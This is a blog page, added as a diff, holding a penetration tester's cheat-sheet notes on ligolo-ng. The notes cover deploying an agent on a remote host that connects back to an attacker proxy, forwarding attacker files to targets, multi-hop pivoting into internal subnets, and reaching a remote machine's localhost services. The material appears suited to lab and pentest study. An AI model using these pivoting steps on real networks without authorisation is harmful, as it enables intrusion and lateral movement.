@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html style="height: 100%;" lang="en">
+  <head>
+    <title>reo</title>
+<meta name="description" content="Leop homepage">
+
+<meta property="og:locale" content="en_CA">
+<meta property="og:site_name" content="LeoG Homepage">
+<meta property="og:title" content="reo">
+<meta property="og:url" content="https://reo.github.io/blog">
+<meta property="og:type" content="article">
+<meta property="og:description" content="on Cryptography, Malware, and Math">
+<meta property="og:image" content="https://reo.github.io/assets/images/thumb-smal.jpg">
+<meta property="og:image:width" content="1199">
+<meta property="og:image:height" content="800">
+
+<meta itemprop="name" content="Leogp Blog">
+<meta itemprop="url" content="https://reo.github.io/blog">
+<meta itemprop="description" content="on Cryptography, Malware, and Math">
+<meta itemprop="thumbnailUrl" content="https://reo.github.io/assets/images/thumb-smal.jpg">
+<link rel="image_src" href="https://reo.github.io/assets/images/thumb-smal.jpg">
+<meta itemprop="image" content="https://reo.github.io/assets/images/thumb-smal.jpg">
+<meta itemprop="author" content="Leo">
+<meta itemprop="datePublished" content="2021-02-10T10:55:54-0500">
+<meta itemprop="dateModified" content="2021-06-21T10:01:18-0500">
+<meta itemprop="headline" content="Leogp Homepage \u2014 Blog: on Cryptography, Malware, and Math">
+<meta itemprop="publisher" content="Leogp">
+
+<meta name="twitter:title" content="Leogp Homepage">
+<meta name="twitter:image" content="https://reo.github.io/assets/images/thumb-smal.jpg">
+<meta name="twitter:url" content="https://reo.github.io/blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:description" content="Leogp Homepage \u2014 Blog: on Cryptography, Malware, and Math">
+<meta name="description" content="">
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<script type="application/ld+json">{"name":"Leogp Homepage \u2014 Blog: on Cryptography, Malware, and Math","url":"https://reo.github.io/blog","datePublished":"2021-02-10T10:55:54-0500","dateModified":"2021-06-21T10:01:18-0500","headline":"Leogp Homepage \u2014 Blog: on Cryptography, Malware, and Math","author":"Leonardo G.","publisher":{"name":"Self-Published","logo":{"@type":"ImageObject"},"@context":"http://schema.org","@type":"Organization"},"image":"https://reo.github.io/assets/images/thumb-smal.jpg","@context":"http://schema.org","@type":"Article"}</script>
+
+<meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+
+<meta name="theme-color" content="#000">
+<link rel="stylesheet" href="/assets/css/style.css">
+
+
+
+
+  </head>
+  <body style="position: relative; min-height: 100%; top: 0px;" class="dark  test.md ">
+    <nav id="nav_hp" class="sidenav collapse invert-color">
+  <!-- close button div
+  <div id="menu" style="display:block; width:100%">
+    <a href="javascript:void(0)" class="closebtn hide-large"
+				 style="line-height: 0.35; font-size:5.5vmax; margin-left:calc(6rem + 20vmin - 13vmax)"
+				 onclick="close_nav()">&times;</a>
+  </div>
+  -->
+  <!-- items div -->
+  <div id="menu" class="sidenav-items" style="display:block; width:100%">
+  
+  <p><a href="/" >TOP</a></p>
+  
+  <p><a href="/about.html" >ABOUT</a></p>
+  
+  <p><a href="/blog.html" >BLOG</a></p>
+  
+  </div>
+</nav>
+<div class="overlay hide-large" onclick="close_nav()" style="cursor:pointer"
+				title="close side menu" id="overlay"></div>
+<span class="hide-large" style="font-size:30px; cursor:pointer; position:fixed; top:3vh; left:1.2vw" onclick="open_nav()">&#9776;</span>
+<script>
+	// Open and close sidebar
+	function open_nav() {
+		document.getElementById("nav_hp").style.width = "calc(6rem + 20vmin)";
+		document.getElementById("overlay").style.display = "block";
+	}
+	function close_nav() {
+		document.getElementById("nav_hp").style.width = "0px";
+		document.getElementById("overlay").style.display = "none";
+	}
+</script>
+<!--
+	<p><a href="http://localhost:4000">TOP</a></p>
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+-->
+
+    <div class="hp-contents">
+      <h2 class="title">ligolo-ng</h2>
+      <div class="-container">
+        <div class="-content focus-content">
+
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="post-content" itemprop="articleBody">
+    <p>https://github.com/nicocha30/ligolo-ng/wiki/Quickstart
+Runs on port 11601 by default</p>
+
+<h2 id="quickstart">Quickstart</h2>
+<ol>
+  <li>Upload <code class="language-plaintext highlighter-rouge">agent</code> to the remote host, don’t run it yet</li>
+  <li>Start the proxy on the attacker machine
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> ./proxy <span class="nt">-selfcert</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Create the interface(s) in the ligolo-ng CLI for each agent as needed
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» interface_create <span class="nt">--name</span> ligolo
+</code></pre></div>    </div>
+  </li>
+  <li>Start the agent on the remote host (and background process)<br /><br />
+<em>Linux (POSIX):</em>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./agent <span class="nt">-connect</span> ENTER_LISTENING_IP_HERE:11601 <span class="nt">-ignore-cert</span> &amp;
+</code></pre></div>    </div>
+    <p><br />
+<em>Windows (Powershell):</em></p>
+    <pre><code class="language-Powershell">Start-Job { .\agent.exe -connect ENTER_LISTENING_IP_HERE:11601 -ignore-cert }
+</code></pre>
+  </li>
+  <li>Wait for the ligolo-ng proxy to detect that the agent has connected</li>
+  <li>In the Ligolo-ng CLI, run <code class="language-plaintext highlighter-rouge">session</code> and select the desired agent</li>
+  <li>Start the tunnel on the interface created in step 3
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» tunnel_start <span class="nt">--tun</span> ligolo
+</code></pre></div>    </div>
+  </li>
+  <li>Find and confirm the subnet you wanna forward running <code class="language-plaintext highlighter-rouge">ifconfig</code> in the ligolo-ng CLI</li>
+  <li>Set up the route from step 8 in the ligolo_ng CLI
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» interface_add_route <span class="nt">--name</span> ligolo <span class="nt">--route</span> 172.16.1.0/24
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>NOTE: [[Network Enumeration]] nmap scans need to run with <code class="language-plaintext highlighter-rouge">--unprivileged</code></strong></p>
+
+<h2 id="listeners">Listeners</h2>
+<p>On the ligolo-ng CLI</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» listener_add <span class="nt">--addr</span> 0.0.0.0:41337 <span class="nt">--to</span> 0.0.0.0:41337
+» listener_list
+</code></pre></div></div>
+<p><strong>Make sure the correct session is selected</strong></p>
+<ul>
+  <li>Forwards connections made to the agent on port <code class="language-plaintext highlighter-rouge">--addr</code> to the attacker machine on port <code class="language-plaintext highlighter-rouge">--to</code></li>
+  <li>Consider this situation with the listener set up:
+    <ul>
+      <li>Attacker is running an HTTP server on 172.16.1.0/24 port 41337</li>
+      <li>Target is only on the 172.16.2.0/24 network</li>
+      <li>Agent is dual-homed with 172.16.1.0/24 and 172.16.2.0/24</li>
+      <li>Agent has IP 172.16.2.10 on the 172.16.2.0/24 network
+        <hr />
+      </li>
+      <li>Target runs <code class="language-plaintext highlighter-rouge">curl 172.16.2.10:41337/my_file</code></li>
+      <li>The listener is set up so this is forwarded to the attacker</li>
+      <li>Target is able to get the file from the attacker</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="multi-pivoting">Multi-Pivoting</h2>
+<p>Using the same names and IP addresses as the example in [[#Listeners]]</p>
+<ol>
+  <li>Set up a listener on Agent for the port ligolo-ng proxy uses (11601)
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» listener_add <span class="nt">--addr</span> 0.0.0.0:11601 <span class="nt">--to</span> 127.0.0.1:11601 <span class="nt">--tcp</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Run the agent on Target with the IP <code class="language-plaintext highlighter-rouge">172.16.2.10</code> and port from step 1</li>
+  <li>The proxy on the attacker machine receives the agent connection</li>
+  <li>Change session to the new connection on the ligolo-ng CLI
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» session
+</code></pre></div>    </div>
+  </li>
+  <li>Create the new interface and set up routes/tunnels on the ligolo-ng CLI
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» interface_create <span class="nt">--name</span> ligolo2
+» start <span class="nt">--tun</span> ligolo2
+» interface_add_route <span class="nt">--name</span> ligolo2 <span class="nt">--route</span> 172.16.2.0/24
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>Can now reach the <code class="language-plaintext highlighter-rouge">172.16.2.0/24</code> network via the Target machine</p>
+
+<h2 id="port-forward-for-localhost">Port Forward for Localhost</h2>
+<p><strong>Make sure the correct session is selected</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Agent : user@host2] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
+</code></pre></div></div>
+<p>NOTE this is on host2, there’s a service on localhost:4444 that I want to access</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Agent : user@host2] » interface_create --name ligolo2
+</code></pre></div></div>
+<p>Create a new tun interface for the second pivot</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Agent : user@host2] » start --tun ligolo2
+[Agent : user@host2] » interface_add_route --name ligolo2 --route 240.0.0.1/32
+</code></pre></div></div>
+<p>240.0.0.1 is an alias for localhost on the remote machine
+Can now interact with services running on localhost on the remote machine by interacting with 240.0.0.1
+Eg. <code class="language-plaintext highlighter-rouge">nc -nv 240.0.0.1 4444</code></p>
+
+<h3 id="cleanup">Cleanup</h3>
+<p>Can delete interfaces using the ligolo-ng CLI:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifdel <span class="nt">--name</span> ligolo <span class="c"># Delete the interface "ligolo"</span>
+</code></pre></div></div>
+
+<h2 id="troubleshooting">Troubleshooting</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip a                       <span class="c"># Interface info</span>
+ip route                   <span class="c"># Routes info</span>
+ip route del 172.16.1.0/24 <span class="c"># Delete routes</span>
+</code></pre></div></div>
+
+
+  </div>
+</article>
+
+
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
